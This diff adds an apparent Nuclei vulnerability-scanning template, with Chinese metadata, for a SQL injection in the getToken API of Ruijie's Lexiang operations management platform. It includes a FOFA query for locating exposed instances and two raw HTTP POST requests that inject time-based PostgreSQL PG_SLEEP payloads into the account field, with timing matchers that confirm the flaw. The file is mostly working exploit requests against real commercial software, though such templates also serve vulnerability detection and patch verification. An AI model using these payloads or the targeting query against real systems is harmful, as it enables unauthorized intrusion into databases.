@@ -1,0 +1,31 @@
+id: ruijie-lexiang-gettoken-sql
+info:
+  name: 锐捷乐享智能运维管理平台 getToken 接口 SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: web.title="乐享智能运维管理平台"
+      锐捷乐享智能运维管理平台的getToken接口存在SQL注入漏洞，攻击者可通过构造恶意请求执行任意SQL命令，从而获取数据库敏感信息。
+  tags: 锐捷乐享智能运维管理平台
+http:
+- raw:
+  - |
+    POST /auth-ui/v1/api/user/token/getToken HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+
+    account=admin');SELECT PG_SLEEP(5)--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
+  - |
+    POST /auth-ui/v1/api/user/token/getToken HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+
+    account=admin');SELECT PG_SLEEP(8)--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
